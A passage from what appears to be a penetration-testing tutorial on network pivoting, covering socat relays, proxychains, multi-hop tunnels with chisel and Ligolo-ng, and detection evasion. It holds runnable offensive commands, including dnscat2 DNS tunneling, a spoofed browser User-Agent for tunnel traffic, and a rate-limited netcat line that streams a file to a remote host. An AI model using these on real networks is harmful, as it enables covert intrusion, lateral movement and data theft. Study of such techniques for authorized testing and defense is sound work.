SOCKS4:socks_server:internal_host:80,socksport</span><span class="token operator">=</span><span class="token number">1080</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># File-based relay for covert channels</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat TCP-LISTEN:8080,fork SYSTEM:</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cat &gt; /tmp/tunnel; cat /tmp/tunnel&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Serial port tunneling</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat TCP-LISTEN:2001,fork /dev/ttyS0,raw,echo</span><span class="token operator">=</span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Unix socket relay</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat TCP-LISTEN:8080,fork UNIX-CONNECT:/var/run/service.sock</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="12-proxychains-transparent-proxy-integration">12. Proxychains: Transparent Proxy Integration<a href="#12-proxychains-transparent-proxy-integration" class="hash-link" aria-label="Direct link to 12. Proxychains: Transparent Proxy Integration" title="Direct link to 12. Proxychains: Transparent Proxy Integration" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>Proxychains must be installed on the system where you intend to tunnel applications. Edit the proxychains configuration files to reflect the actual proxy endpoints and chains you wish to use.</p></div></div>
<p>Proxychains enables transparent proxy chain integration for arbitrary applications:</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="121-configuration-management">12.1 Configuration Management<a href="#121-configuration-management" class="hash-link" aria-label="Direct link to 12.1 Configuration Management" title="Direct link to 12.1 Configuration Management" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># /etc/proxychains.conf or ~/.proxychains/proxychains.conf</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dynamic_chain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxy_dns</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tcp_read_time_out </span><span class="token number">15000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tcp_connect_time_out </span><span class="token number">8000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">ProxyList</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socks5 </span><span class="token number">127.0</span><span class="token plain">.0.1 </span><span class="token number">9050</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http </span><span class="token number">127.0</span><span class="token plain">.0.1 </span><span class="token number">8080</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socks4 </span><span class="token number">192.168</span><span class="token plain">.1.100 </span><span class="token number">1080</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="122-chain-configuration-types">12.2 Chain Configuration Types<a href="#122-chain-configuration-types" class="hash-link" aria-label="Direct link to 12.2 Chain Configuration Types" title="Direct link to 12.2 Chain Configuration Types" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Dynamic chain (uses only working proxies)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dynamic_chain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Strict chain (uses all proxies in order)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">strict_chain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Random chain (random proxy order)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">random_chain</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="123-application-integration">12.3 Application Integration<a href="#123-application-integration" class="hash-link" aria-label="Direct link to 12.3 Application Integration" title="Direct link to 12.3 Application Integration" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Network scanning through proxy chain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxychains nmap </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-sT</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-P0</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.10.10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Web application testing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxychains sqlmap </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-u</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;http://internal_target/page.php?id=1&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SSH through proxy chain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxychains </span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> user@internal_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># File transfer through proxies</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxychains </span><span class="token function" style="color:rgb(80, 250, 123)">scp</span><span class="token plain"> file.txt user@internal_host:/tmp/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Browser integration</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxychains firefox</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Custom application proxying</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxychains ./custom_tool </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--target</span><span class="token plain"> internal_host</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="13-advanced-pivot-chaining-methodologies">13. Advanced Pivot Chaining Methodologies<a href="#13-advanced-pivot-chaining-methodologies" class="hash-link" aria-label="Direct link to 13. Advanced Pivot Chaining Methodologies" title="Direct link to 13. Advanced Pivot Chaining Methodologies" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>The following examples combine multiple pivoting techniques and assume prior establishment of each tunnel or session as described in the previous sections. Adjust hostnames, IPs, ports, and tool invocations for your topology.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="131-multi-hop-architecture-design">13.1 Multi-Hop Architecture Design<a href="#131-multi-hop-architecture-design" class="hash-link" aria-label="Direct link to 13.1 Multi-Hop Architecture Design" title="Direct link to 13.1 Multi-Hop Architecture Design" translate="no">‚Äã</a></h3>
<p>Effective pivot chaining requires systematic network mapping and route optimization across multiple security boundaries:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Internet ‚Üí DMZ Host ‚Üí Internal Network ‚Üí Workstation ‚Üí Restricted Network ‚Üí Critical Server</span><br></span></code></pre></div></div>
<p>The following sequence diagram illustrates the establishment of a complete multi-hop pivot chain:</p>
<!-- -->
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="implementation-strategy">Implementation Strategy:<a href="#implementation-strategy" class="hash-link" aria-label="Direct link to Implementation Strategy:" title="Direct link to Implementation Strategy:" translate="no">‚Äã</a></h4>
<ol>
<li><strong>Initial Foothold</strong>: Compromise externally accessible system</li>
<li><strong>Network Reconnaissance</strong>: Enumerate internal network topology</li>
<li><strong>Lateral Movement</strong>: Establish additional compromised hosts</li>
<li><strong>Route Optimization</strong>: Configure efficient traffic routing</li>
<li><strong>Persistence</strong>: Maintain reliable communication channels</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="132-hierarchical-routing-implementation">13.2 Hierarchical Routing Implementation<a href="#132-hierarchical-routing-implementation" class="hash-link" aria-label="Direct link to 13.2 Hierarchical Routing Implementation" title="Direct link to 13.2 Hierarchical Routing Implementation" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Primary route through most stable pivot</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ip</span><span class="token plain"> route </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.0.0/16 via </span><span class="token number">192.168</span><span class="token plain">.1.100 dev eth0 metric </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Secondary route for redundancy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ip</span><span class="token plain"> route </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.0.0/16 via </span><span class="token number">192.168</span><span class="token plain">.1.101 dev eth0 metric </span><span class="token number">10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Tertiary route through alternative path</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ip</span><span class="token plain"> route </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.0.0/16 via </span><span class="token number">192.168</span><span class="token plain">.1.102 dev eth0 metric </span><span class="token number">20</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Load balancing across multiple paths</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ip</span><span class="token plain"> route </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.0.0/16 nexthop via </span><span class="token number">192.168</span><span class="token plain">.1.100 weight </span><span class="token number">1</span><span class="token plain"> nexthop via </span><span class="token number">192.168</span><span class="token plain">.1.101 weight </span><span class="token number">1</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="133-cascade-tunneling-example">13.3 Cascade Tunneling Example<a href="#133-cascade-tunneling-example" class="hash-link" aria-label="Direct link to 13.3 Cascade Tunneling Example" title="Direct link to 13.3 Cascade Tunneling Example" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Hop 1: SSH tunnel to DMZ host</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-D</span><span class="token plain"> </span><span class="token number">9050</span><span class="token plain"> user@dmz_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Hop 2: Chisel through first tunnel</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxychains chisel client internal_host:8080 R:socks2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Hop 3: Ligolo-ng through second tunnel</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxychains ./agent </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-connect</span><span class="token plain"> deep_internal:11601</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Hop 4: Direct tool access through all hops</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxychains nmap </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-sT</span><span class="token plain"> critical_network_range</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="14-detection-evasion-and-operational-security">14. Detection Evasion and Operational Security<a href="#14-detection-evasion-and-operational-security" class="hash-link" aria-label="Direct link to 14. Detection Evasion and Operational Security" title="Direct link to 14. Detection Evasion and Operational Security" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>Evasion strategies assume prior knowledge of defensive monitoring systems and network policies in your environment. Adapt timing, protocol, and behavioral parameters to maximize stealth in your particular context.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="141-operational-timeline-and-evasion-strategy">14.1 Operational Timeline and Evasion Strategy<a href="#141-operational-timeline-and-evasion-strategy" class="hash-link" aria-label="Direct link to 14.1 Operational Timeline and Evasion Strategy" title="Direct link to 14.1 Operational Timeline and Evasion Strategy" translate="no">‚Äã</a></h3>
<p>The following timeline illustrates optimal timing and sequencing of evasion techniques throughout an operation:</p>
<!-- -->
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="142-traffic-analysis-evasion">14.2 Traffic Analysis Evasion<a href="#142-traffic-analysis-evasion" class="hash-link" aria-label="Direct link to 14.2 Traffic Analysis Evasion" title="Direct link to 14.2 Traffic Analysis Evasion" translate="no">‚Äã</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="protocol-mimicry-techniques">Protocol Mimicry Techniques:<a href="#protocol-mimicry-techniques" class="hash-link" aria-label="Direct link to Protocol Mimicry Techniques:" title="Direct link to Protocol Mimicry Techniques:" translate="no">‚Äã</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># HTTP traffic camouflage</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel server </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">80</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;user:pass&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--header</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span><span class="token plain"> server:80 R:socks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># HTTPS certificate spoofing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">openssl req </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-x509</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-newkey</span><span class="token plain"> rsa:4096 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-keyout</span><span class="token plain"> key.pem </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-out</span><span class="token plain"> cert.pem </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-days</span><span class="token plain"> </span><span class="token number">365</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-nodes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat OPENSSL-LISTEN:443,cert</span><span class="token operator">=</span><span class="token plain">cert.pem,fork TCP:127.0.0.1:1234</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># DNS query tunneling</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dnscat2 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--secret</span><span class="token operator">=</span><span class="token plain">secretkey subdomain.legitimate-domain.com</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="timing-randomization">Timing Randomization:<a href="#timing-randomization" class="hash-link" aria-label="Direct link to Timing Randomization:" title="Direct link to Timing Randomization:" translate="no">‚Äã</a></h4>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> random</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">jittered_connection</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">min_delay</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> max_delay</span><span class="token operator">=</span><span class="token number">30</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    delay </span><span class="token operator">=</span><span class="token plain"> random</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">uniform</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">min_delay</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> max_delay</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">delay</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Establish connection</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="volume-control-implementation">Volume Control Implementation:<a href="#volume-control-implementation" class="hash-link" aria-label="Direct link to Volume Control Implementation:" title="Direct link to Volume Control Implementation:" translate="no">‚Äã</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Bandwidth limiting with tc (traffic control)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tc qdisc </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> dev eth0 root handle </span><span class="token number">1</span><span class="token plain">: htb default </span><span class="token number">12</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tc class </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> dev eth0 parent </span><span class="token number">1</span><span class="token plain">: classid </span><span class="token number">1</span><span class="token plain">:1 htb rate 100mbit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tc class </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> dev eth0 parent </span><span class="token number">1</span><span class="token plain">:1 classid </span><span class="token number">1</span><span class="token plain">:12 htb rate 1mbit ceil 2mbit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Application-level rate limiting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">pv</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-L</span><span class="token plain"> </span><span class="token number">1024</span><span class="token plain"> </span><span class="token operator">&lt;</span><span class="token plain"> largefile.dat </span><span class="token operator">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">nc</span><span class="token plain"> target_host </span><span class="token number">443</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="142-behavioral-analysis-evasion">14.2 Behavioral Analysis Evasion<a href="#142-behavioral-analysis-evasion" class="hash-link" aria-label="Direct link to 14.2 Behavioral Analysis Evasion" title="Direct link to 14.2 Behavioral Analysis Evasion" translate="no">‚Äã</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="credential-management">Credential Management:<a href="#credential-management" class="hash-link" aria-label="Direct link to Credential Management:" title="Direct link to Credential Management:" translate="no">‚Äã</a></h4>
